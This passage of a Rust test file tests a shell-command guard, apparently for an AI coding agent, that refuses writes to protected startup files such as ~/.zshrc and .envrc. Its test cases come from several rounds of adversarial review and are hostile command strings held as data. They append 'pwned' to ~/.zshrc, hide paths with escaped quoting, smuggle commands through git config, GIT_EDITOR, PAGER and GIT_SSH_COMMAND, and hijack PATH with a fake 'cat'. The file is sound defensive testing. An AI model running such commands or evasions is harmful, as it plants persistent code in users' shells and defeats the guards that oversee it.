        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "echo x > ~root/.zshrc",
        "echo x > ~root/notes.txt",
        "cd H/ && echo x >> .zshrc",
        "cd ~root && echo x > .zshrc",
        "tar -xf a.tar -C ~root",
        "cd ~root; printf '%s\\n' a | xargs rm",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round two, finding 3: an oversized glob whose last segment is a
/// literal that is not a class name falls through to the ordinary rule.
#[test]
fn an_oversized_glob_ending_in_a_plain_name_is_judged_by_its_directory() {
    let f = Fixture::new();
    for n in 0..4200 {
        std::fs::write(f.project.join(format!("f{n}")), "").unwrap();
    }
    let mut wrong = Vec::new();
    for command in [
        "rm -rf **/node_modules",
        "rm -rf node_modules",
        "rm -rf **/{dist,node_modules}",
        "cd /nonexistent/project && rm -rf **/node_modules",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "rm -rf **/.zshrc",
        "rm -rf **/.envrc",
        "rm -rf **/.*",
        "rm -rf **",
        "rm -rf **/",
        "echo x > ~/**/.zshrc",
        "rm -rf **/{dist,.envrc}",
        "rm -rf **/fish",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    // From the home an oversized relative glob still lands in the home.
    for n in 0..4200 {
        std::fs::write(f.home.join(format!("g{n}")), "").unwrap();
    }
    if !refused(&f.judge_in("rm -rf **/node_modules", &f.home, &f.env())) {
        wrong.push("allowed from the home: rm -rf **/node_modules".to_string());
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round three. The one rule: a line that names a class file refuses
/// when a command on it can take its script from text the call produced.
/// Interpreters and shells take it from any channel; a script tool (awk, sed,
/// make, ed, ex, patch, tclsh, m4, git apply) takes it from a file the call
/// writes, a heredoc or substitution, or from a pipe when stdin is its script.
/// A data pipe into awk or sed with an inline script is not a script channel.
#[test]
fn script_tools_fed_text_the_call_produced_refuse() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -f a.awk",
        "printf 'w src/.envrc\\n' > s.sed; sed -f s.sed README.md",
        "printf 'w src/.envrc\\n' > s.sed; sed -nf s.sed README.md",
        "printf 'w src/.envrc\\n' > s.sed; sed --file=s.sed README.md",
        "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make",
        "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make -C . all",
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | awk -f -",
        "printf 'w src/.envrc\\n' | sed -f - README.md",
        "printf '%s\\n' 'w src/.envrc' 'q' | ed -s README.md",
        "printf '%s\\n' 'w src/.envrc' 'q' | ex -s README.md",
        "printf '%s\\n' '--- a/src/.envrc' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | patch -p1",
        "printf '%s\\n' '--- /dev/null' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | git apply",
        "echo 'exec sh -c {echo x >> src/.envrc}' > t.tcl; tclsh t.tcl",
        "echo 'syscmd(`echo x >> src/.envrc`)' > t.m4; m4 t.m4",
        "printf 'echo x >> src/.envrc\\n' | parallel",
        "echo 'echo x >> src/.envrc' | at now",
        "echo 'echo x >> src/.envrc' | tee r.sh | bash",
        "tee r.sh <<< 'echo x >> src/.envrc'; bash r.sh",
        "awk -f <(echo 'BEGIN{print 1 > \".envrc\"}')",
        "make -f - <<'EOF'\nall:\n\techo x >> src/.envrc\nEOF",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
        "grep alias ~/.zshrc | sed -n '1p'",
        "cat ~/.zshrc | awk -F: '{print $1}'",
        "grep -c alias ~/.zshrc > count.txt; awk '{print $1}' count.txt",
        "sed -i 's/a/b/' README.md",
        "awk '{print $1}' README.md",
        "make test",
        "make -C crates",
        "bash <(echo 'echo hi')",
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "printf '%s\\n' a b | patch -p1 --dry-run -i fix.diff",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round three, minor: a trailing slash on the glob is the same delete.
#[test]
fn a_trailing_slash_does_not_change_an_oversized_glob_verdict() {
    let f = Fixture::new();
    for n in 0..4200 {
        std::fs::write(f.project.join(format!("f{n}")), "").unwrap();
    }
    let mut wrong = Vec::new();
    for command in [
        "rm -rf **/node_modules/",
        "rm -rf **/node_modules//",
        "rm -rf **/{dist,node_modules}/",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "rm -rf **/",
        "rm -rf **//",
        "rm -rf **/.envrc/",
        "rm -rf **/.*/",
        "rm -rf **/fish/",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. Which options name a script file is a table per tool, so
/// an attached value (`-fa.awk`, `-f./a.awk`, `-nfs.sed`) and gawk's `-i`,
/// `--include` and `-E` read like the spaced `-f`. sed `-i` and `-E` and a
/// data pipe stay reads.
#[test]
fn attached_and_included_script_files_refuse() {
    let f = Fixture::new();
    let awk = "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; ";
    let sed = "printf 'w src/.envrc\\n' > s.sed; ";
    let mut wrong = Vec::new();
    for command in [
        format!("{awk}awk -fa.awk"),
        format!("{awk}awk -f./a.awk"),
        format!("{awk}awk -f/tmp/prog.awk"),
        format!("{awk}gawk -fa.awk"),
        format!("{awk}mawk -fa.awk"),
        format!("{awk}command awk -fa.awk"),
        format!("{awk}exec awk -fa.awk"),
        format!("{awk}gawk -v x=1 -fa.awk"),
        format!("{awk}gawk -i a.awk /dev/null"),
        format!("{awk}gawk -ia.awk /dev/null"),
        format!("{awk}gawk --include=a.awk /dev/null"),
        format!("{awk}gawk --include a.awk /dev/null"),
        format!("{awk}gawk -E a.awk"),
        format!("{awk}gawk -Ea.awk"),
        format!("{awk}gawk --exec=a.awk"),
        format!("{sed}sed -fs.sed README.md"),
        format!("{sed}sed -nfs.sed README.md"),
        format!("{sed}sed -f./s.sed README.md"),
        format!("{sed}sed -n -f ./s.sed README.md"),
        format!("{sed}sed -Enf s.sed README.md"),
        format!("{sed}gsed --file=s.sed README.md"),
    ] {
        if !refused(&f.judge(&command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep -c alias ~/.zshrc > b.txt; sed -i 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -i.bak 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -E 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -n -e '1p' README.md",
        "grep -c alias ~/.zshrc > b.txt; awk -F: '{print $1}' b.txt",
        "grep -c alias ~/.zshrc > b.txt; awk -v f=1 '{print $1}' b.txt",
        "grep alias ~/.zshrc | sed -E 's/a/b/'",
        "grep alias ~/.zshrc | sed -i.bak 's/a/b/'",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | awk -F, '{print $2}'",
        "sed -i 's/a/b/' README.md",
        "make test",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. A command behind `find -exec` or a wrapper the launcher
/// walker does not unwrap, or inside `env -S`, is judged like the same command
/// at the top of the line. Reads through them stay reads.
#[test]
fn nested_and_wrapped_commands_are_judged_like_the_command() {
    let f = Fixture::new();
    let awk = "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; ";
    let sh = "echo 'echo x >> src/.envrc' > r.sh; ";
    let mut wrong = Vec::new();
    let mut cases = Vec::new();
    for exec in ["-exec", "-execdir", "-ok", "-okdir"] {
        cases.push(format!("{sh}find . {exec} sh r.sh \\;"));
        cases.push(format!("{awk}find . {exec} awk -f a.awk \\;"));
    }
    cases.extend([
        format!("{sh}find . -name '*.rs' -exec sh r.sh {{}} +"),
        format!("{sh}find . -name x -o -exec sh r.sh \\;"),
        format!("{sh}find . -exec nice sh r.sh \\;"),
        format!("{sh}find . -exec find . -exec sh r.sh \\; \\;"),
        format!("{sh}nice find . -exec sh r.sh \\;"),
        format!("{sh}flock /tmp/l find . -exec sh r.sh \\;"),
        format!("{sh}flock -c 'find . -exec sh r.sh \\;' /tmp/l"),
        format!("{sh}env -S 'sh r.sh'"),
        format!("{sh}env -Ssh r.sh"),
        format!("{sh}env --split-string='sh r.sh'"),
        format!("{sh}nice env -S 'sh r.sh'"),
        format!("{awk}env -S 'awk -f a.awk'"),
        format!("{awk}/usr/bin/env -S 'awk -f' a.awk"),
    ]);
    for wrapper in [
        "flock /tmp/l",
        "flock -n /tmp/l",
        "flock /tmp/l -c",
        "watch -n1",
        "watch",
        "unbuffer",
        "chronic",
        "sudo",
        "sudo -u me",
        "doas",
        "setsid",
        "taskset 1",
        "chrt 1",
        "arch -arm64",
        "script -q /dev/null",
        "systemd-run",
        "sandbox-exec -p '(version 1)'",
        "ssh localhost",
        "busybox",
        "toybox",
        "time",
        "nohup",
        "nice -n 5",
        "timeout 5",
        "stdbuf -o0",
        "ionice -c 3",
        "caffeinate",
        "xcrun",
    ] {
        cases.push(format!("{awk}{wrapper} awk -f a.awk"));
        cases.push(format!("{sh}{wrapper} sh r.sh"));
    }
    cases.push(format!("{awk}flock /tmp/l -c 'awk -f a.awk'"));
    cases.push(format!("{awk}watch 'awk -f a.awk'"));
    cases.push(format!("{awk}su -c 'awk -f a.awk' me"));
    for command in &cases {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; timeout 5 ls",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    // Wrappers are not data readers: they refuse on a line that names a class
    // file and produces text, whatever they wrap (round five).
    for command in [
        "grep -c alias ~/.zshrc > b.txt; flock lockfile ls",
        "grep alias ~/.zshrc | env -S 'echo hi'",
        "grep alias ~/.zshrc | watch -n1 echo hi",
        "grep alias ~/.zshrc | flock lockfile awk '{print $2}'",
        "grep alias ~/.zshrc | busybox awk '{print $2}'",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. Editors, debuggers and database shells that run a script
/// file the call wrote are rows of the same table as awk and sed.
#[test]
fn editor_and_debugger_script_files_refuse() {
    let f = Fixture::new();
    let vim = "printf 'w src/.envrc\\n' > s.vim; ";
    let sql = "printf '.shell echo x >> src/.envrc\\n' > s.sql; ";
    let gdb = "echo 'shell echo x >> src/.envrc' > g.gdb; ";
    let el = "echo '(shell-command \"echo x >> src/.envrc\")' > s.el; ";
    let mut wrong = Vec::new();
    for command in [
        format!("{vim}vim -Nu NONE -es -c 'so s.vim'"),
        format!("{vim}vim -S s.vim"),
        format!("{vim}vim -es +'so s.vim' +q"),
        format!("{vim}vim --cmd 'so s.vim'"),
        format!("{vim}vi -c 'so s.vim'"),
        format!("{vim}nvim --headless -c 'so s.vim'"),
        format!("{vim}nvim -S s.vim"),
        format!("{vim}nvim -l s.lua"),
        format!("{sql}sqlite3 :memory: '.read s.sql'"),
        format!("{sql}sqlite3 -init s.sql :memory: .quit"),
        format!("{sql}sqlite3 -cmd '.read s.sql' :memory:"),
        "printf '.shell echo x >> src/.envrc\\n' | sqlite3 :memory:".to_string(),
        format!("{gdb}gdb -batch -x g.gdb"),
        format!("{gdb}gdb -batch -command=g.gdb"),
        format!("{gdb}gdb -batch -ex 'source g.gdb'"),
        "echo 'shell echo x >> src/.envrc' | gdb -batch".to_string(),
        format!("{el}emacs --batch -l s.el"),
        format!("{el}emacs --batch --load s.el"),
        format!("{el}emacs --batch --load=s.el"),
        format!("{el}emacs --script s.el"),
        format!("{el}emacs --batch --eval '(load \"s.el\")'"),
    ] {
        if !refused(&f.judge(&command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    // Not data readers: on a line that names a class file and produces text
    // they refuse even when they run no script (round five).
    for command in [
        "grep -c alias ~/.zshrc > b.txt; vim -Nu NONE README.md",
        "grep -c alias ~/.zshrc > b.txt; emacs --version",
        "grep alias ~/.zshrc | vim -",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in ["vim README.md", "emacs --version"] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round five and the design pass. The staged-run rule is an allowlist:
/// a line that names a class file and produces text refuses unless every
/// program on it is a data reader used as one. A reader with a write or exec
/// path of its own (`awk` with `system`, a pipe or a program file, `sed` with
/// `e` or `w`, `sort -o`, `uniq in out`, `git -c`, `git config`) is not one
/// there; an unknown program or option fails closed.
#[test]
fn only_data_readers_may_run_on_a_line_that_names_a_class_file_and_produces_text() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk -f README.md -f -",
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk --file=README.md --file=-",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk -e '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk --source '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk 'BEGIN {} @include \"lib.awk\"'",
        "printf 'w src/.envrc\\n' > s.vim; vim -s s.vim",
        "printf 'w src/.envrc\\n' > s.vim; nvim -s s.vim",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -C /tmp -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env --chdir /tmp -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -u FOO -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env env -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env --split-string='awk -f a.awk'",
        "printf 'echo x >> src/.envrc\\n' | awk '{system($0)}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{system ($0)}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print | \"sh\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{\"sh\" | getline}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print > \"src/.envrc\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print >> \"out\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk -f -",
        "printf 'echo x >> src/.envrc\\n' | awk -e '{system($0)}'",
        "printf 'echo x >> src/.envrc\\n' | sed e",
        "printf 'echo x >> src/.envrc\\n' | sed 's/x/y/e'",
        "printf 'echo x >> src/.envrc\\n' | sed -n 'w out'",
        "printf 'echo x >> src/.envrc\\n' | sed 'r out'",
        "printf 'echo x >> src/.envrc\\n' | sed -f -",
        "printf 'echo x >> src/.envrc\\n' | sort -o out",
        "printf 'echo x >> src/.envrc\\n' | sort -rno out",
        "printf 'echo x >> src/.envrc\\n' | sort --output=out",
        "printf 'echo x >> src/.envrc\\n' | sort --compress-program=sh",
        "printf 'echo x >> src/.envrc\\n' | uniq - out",
        "printf 'echo x >> src/.envrc\\n' | xxd -r -p - out",
        "printf 'echo x >> src/.envrc\\n' | base64 -o out",
        "printf 'echo x >> src/.envrc\\n' | git -c alias.x='!sh' x",
        "printf 'echo x >> src/.envrc\\n' | git apply",
        "printf 'echo x >> src/.envrc\\n' | git am",
        "printf 'echo x >> src/.envrc\\n' | git x",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git config core.fsmonitor 'sh r.sh'; git status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_SSH_COMMAND='sh r.sh' git fetch",
        "printf 'echo x >> src/.envrc\\n' > r.sh; PAGER='sh r.sh' git log",
        "printf 'echo x >> src/.envrc\\n' > cat; PATH=. cat README.md",
        "printf 'echo x >> src/.envrc\\n' > cat; chmod +x cat; ./cat README.md",
        "printf 'echo x >> src/.envrc\\n' > cat; export PATH=.:$PATH; cat README.md",
        "printf 'echo x >> src/.envrc\\n' | xargs sh -c",
        "printf 'echo x >> src/.envrc\\n' | sh",
        "printf 'echo x >> src/.envrc\\n' | rg --pre sh x",
        "printf 'echo x >> src/.envrc\\n' | find . -exec sh {} \\;",
        "printf 'echo x >> src/.envrc\\n' | less",
        "printf 'echo x >> src/.envrc\\n' | dd of=out",
        "printf 'echo x >> src/.envrc\\n' | python3 -",
        "printf 'echo x >> src/.envrc\\n' | cat | sh",
        "source <(printf 'echo x >> src/.envrc\\n')",
        "printf 'echo x >> src/.envrc\\n' > r.sh; . ./r.sh",
        "printf 'echo x >> src/.envrc\\n' > r.sh; /tmp/evil/cat r.sh",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | awk -F: '{print $1}'",
        "grep alias ~/.zshrc | awk -v f=1 '$1 > 5 {print $2}'",
        "grep alias ~/.zshrc | gawk -F, '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
        "grep alias ~/.zshrc | sed -n '1p'",
        "grep alias ~/.zshrc | sed -E 's/a/b/'",
        "grep alias ~/.zshrc | sed -i.bak 's/a/b/'",
        "cat ~/.zshrc | sort | uniq -c | sort -rn | head",
        "cat ~/.zshrc | cut -d: -f1 | tr a-z A-Z | wc -l",
        "cat ~/.zshrc | column -t | nl | tail -3",
        "cat ~/.zshrc | xxd | head",
        "cat ~/.zshrc | base64",
        "cat ~/.zshrc | jq -R .",
        "cat ~/.zshrc | tee out.txt",
        "cat ~/.zshrc | git hash-object --stdin",
        "git log --oneline | head; git status",
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "git diff -- .envrc | head",
        "cd crates && cat ~/.zshrc | wc -l",
        "grep -c alias ~/.zshrc > b.txt; sed -i 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; awk -F: '{print $1}' b.txt",
        "grep -c alias ~/.zshrc > b.txt; timeout 5 ls",
        "grep -c alias ~/.zshrc > b.txt; find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; /bin/cat b.txt",
        "grep -c alias ~/.zshrc > b.txt; git config --get user.name",
        "cat <(echo hello)",
        "diff <(echo a) <(echo b)",
        "make test",
        "sed -i 's/a/b/' README.md",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok design check. A git subcommand that takes its path list from produced
/// text (`--pathspec-from-file=-`, `--stdin`, an interactive `-p`) lets that
/// text pick the files git rewrites or deletes, so it is not a data reader.
/// Plain git commands that only name their files stay allowed.
#[test]
fn git_reading_paths_from_produced_text_is_not_a_reader() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "printf 'sub/.envrc\\n' | git checkout --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git checkout HEAD --pathspec-from-file -",
        "printf 'sub/.envrc\\n' | git restore --source=HEAD --worktree --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git rm -q --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git reset --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git add --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' | git stash push --pathspec-from-file=-",
        "printf 'sub/.envrc\\n' > list; git checkout --pathspec-from-file=list",
        "printf 'sub/.envrc\\n' | git checkout-index --stdin",
        "printf 'sub/.envrc\\n' | git update-index --stdin",
        "printf 'sub/.envrc\\n' | git update-index --index-info",
        "printf 'sub/.envrc\\n' | git hash-object -w --stdin",
        "printf 'sub/.envrc\\n' | git hash-object -w --stdin-paths",
        "printf 'create refs/heads/x HEAD # .envrc\\n' | git update-ref --stdin",
        "printf 'sub/.envrc\\n' | git rev-list --stdin",
        "printf 'sub/.envrc\\n' | git filter-branch --index-filter cat",
        "echo .envrc > /dev/null; printf 'y\\n' | git checkout -p",
        "echo .envrc > /dev/null; printf 'y\\n' | git restore --patch",
        "echo .envrc > /dev/null; printf 'y\\n' | git clean -fdi",
        "printf 'sub/.envrc\\n' | git stash -p",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "git diff -- .envrc | head",
        "git log -p --oneline | head",
        "git log -i --grep envrc | head",
        "git grep -i envrc | head",
        "git status; git log --oneline | head",
        "grep -c alias ~/.zshrc > b.txt; git add README.md",
        "grep -c alias ~/.zshrc > b.txt; git checkout -b feature",
        "grep -c alias ~/.zshrc > b.txt; git restore --staged README.md",
        "grep -c alias ~/.zshrc > b.txt; git commit -am wip",
        "grep alias ~/.zshrc | sort | uniq | head",
        "diff <(cat ~/.zshrc) <(cat ~/.bashrc)",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// The false refusals the allowlist admits, named in the AC-7 clause: lines
/// that only read still refuse when they name a class file, produce text and
/// run a program that is not a listed data reader, and the refusal says to
/// read the file in its own call.
#[test]
fn ordinary_lines_with_a_non_reader_refuse_by_design() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "grep alias ~/.zshrc > b.txt; cp b.txt docs/a.txt",
        "grep alias ~/.zshrc > b.txt; cargo test",
        "grep alias ~/.zshrc | vim -",
        "grep alias ~/.zshrc | awk '/a|b/ {print}'",
        "grep alias ~/.zshrc | sed 's|a|b|'",
        "grep alias ~/.zshrc | busybox awk '{print $1}'",
    ] {
        let verdict = f.judge(command);
        if !refused(&verdict)
            || !verdict
                .iter()
                .any(|v| v.message.contains("read the file in its own call"))
        {
            wrong.push(format!("not refused with the rewrite: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round six. Quoting reaches every check decoded (`$'\\x2ezshrc'`,
/// `'.zs''hrc'`, `$"..."`), and a command-valued setting that names a class
/// file refuses on every line: a global `git -c` or `--config-env`, and
/// `EDITOR`, `GIT_EDITOR`, `PAGER`, `GIT_SSH_COMMAND`, `LESSOPEN` and the
/// like, whether or not the line produces text.
#[test]
fn quoting_is_decoded_and_command_valued_settings_are_read() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "grep alias ~/.zshrc | awk $'BEGIN{printf \"awk-rc\\n\" \\x3e (ENVIRON[\"HOME\"] \"/\\x2ezshrc\")}'",
        "bash -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
        "zsh -c $'echo pwned \\x3e\\x3e \\x24HOME/\\x2ezshrc'",
        "python3 -c $'import os; open(os.environ[\"HOME\"]+\"/\\x2ezshrc\",\"a\").write(\"py-pwned\\n\")'",
        "echo x >> $HOME/$'\\x2ezshrc'",
        "echo x >> \"$HOME\"/$'\\x2ezshrc'",
        "echo x >> $HOME/$'\\056zshrc'",
        "echo x >> $HOME/$'\\u002ezshrc'",
        "echo x | tee $HOME/$'\\x2ezshrc'",
        "echo x >> ~/'.zs''hrc'",
        "echo x >> ~/.z\"s\"hrc",
        "echo x >> ~/.zshr$\"c\"",
        "echo x >> ~/.zs\\\nhrc",
        "echo $'\\'' ; echo x >> ~/.zshrc; echo '",
        "printf '%s' $'\\x78' | tee ~/.zshrc",
        "git -c core.fsmonitor='echo pwned >> ~/.zshrc' status",
        "git -c core.pager='sh -c \"echo >> ~/.zshrc\"' log",
        "FSM='echo >> ~/.zshrc' git --config-env=core.fsmonitor=FSM status",
        "GIT_EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "GIT_EDITOR='echo pwned >> $HOME/.zshrc' git commit --allow-empty",
        "EDITOR='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "VISUAL='echo pwned >> ~/.zshrc' git commit --allow-empty",
        "export VISUAL='echo >> ~/.zshrc'; git commit --allow-empty",
        "PAGER='cat >> ~/.zshrc' git log",
        "GIT_PAGER='cat >> ~/.zshrc' git log",
        "GIT_SSH_COMMAND='echo >> ~/.zshrc' git fetch",
        "GIT_EXTERNAL_DIFF='echo >> ~/.zshrc' git diff",
        "LESSOPEN='|echo >> ~/.zshrc %s' less README.md",
        "MANPAGER='cat >> ~/.zshrc' man ls",
        "BROWSER='echo >> ~/.zshrc' open x",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='echo >> ~/.zshrc' git status",
        "env GIT_EDITOR='echo >> ~/.zshrc' git commit --allow-empty",
        "export FSM='echo >> ~/.zshrc'; git --config-env core.fsmonitor=FSM status",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git status",
        "git log -p -- .envrc | head",
        "git diff -- .envrc",
        "echo hello | make",
        "cargo test",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "git -c color.ui=never status",
        "git -c user.name=x commit -m wip",
        "git -c core.editor=true rebase main",
        "EDITOR=vim git commit",
        "PAGER=less git log",
        "export EDITOR=vim",
        "GIT_SSH_COMMAND='ssh -i key' git fetch",
        "echo $'a\\tb'",
        "printf $'%s\\n' x",
        "echo $'it\\'s'; ls",
        "awk $'{print $1}' README.md",
        "echo $'\\x68\\x69' > notes.txt",
        "echo x >> $'notes.txt'",
        "echo x > ~/'notes.txt'",
        "cat ~/$'\\x2ezshrc'",
        "grep alias ~/.zshrc | sed $'s/a/b/'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round seven. A git global setting or a command-valued variable is
/// read by value: it refuses when the value names a class file, or when it
/// cannot be read on a line that names one, or when it is a command other
/// than a bare viewer on a staged line. An innocent `-c color.ui=never`,
/// `EDITOR=vim` or `PAGER=less` leaves a read of `.envrc` a read. An
/// assignment that only uses `$HOME`, `${HOME}`, `$ZDOTDIR`,
/// `$XDG_CONFIG_HOME` or an earlier assigned name is substituted, so
/// `F=$HOME/.zshrc GIT_EDITOR='echo x >> $F'` names the file.
#[test]
fn git_settings_are_judged_by_key_kind_and_commands_by_their_words() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "git -c core.gitProxy='echo x >> ~/.zshrc' fetch",
        "git -c core.gitProxy='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c include.path=/tmp/x log -p -- .envrc | head",
        "git -c includeIf.gitdir:/a/.path=/tmp/x log -p -- .envrc | head",
        "git -c remote.o.uploadpack=/tmp/r.sh log -p -- .envrc | head",
        "git -c remote.o.receivepack=/tmp/r.sh log -p -- .envrc | head",
        "git -c mystery.key=1 log -p -- .envrc | head",
        "git -c core.pager='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c pager.log='sh /tmp/r.sh' log -p -- .envrc | head",
        "git -c core.fsmonitor=/tmp/r.sh status -- .envrc | head",
        "git -c color.ui='echo x >> ~/.zshrc' log",
        "git -c user.name='$(echo x >> ~/.zshrc)' log",
        "C=1 git --config-env mystery.key=C log -p -- .envrc | head",
        "C=1 git --config-env=mystery.key=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env core.gitProxy=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env=core.gitProxy=C log -p -- .envrc | head",
        "C=1 git --config-env include.path=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env core.pager=C log -p -- .envrc | head",
        "C='sh /tmp/r.sh' git --config-env=core.pager=C log -p -- .envrc | head",
        "git --config-env color.ui=C log -p -- .envrc | head",
        "git --config-env color.ui=NOPE log -p -- .envrc | head",
        "git --config-env=color.ui=NOPE log -p -- .envrc | head",
        "C=~/.zshrc git --config-env color.ui=C log",
        "C=~/.zshrc git --config-env=color.ui=C log",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.gitProxy GIT_CONFIG_VALUE_0='sh /tmp/r.sh' git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=mystery.key GIT_CONFIG_VALUE_0=1 git log -p -- .envrc | head",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=include.path GIT_CONFIG_VALUE_0=/tmp/x git log -p -- .envrc | head",
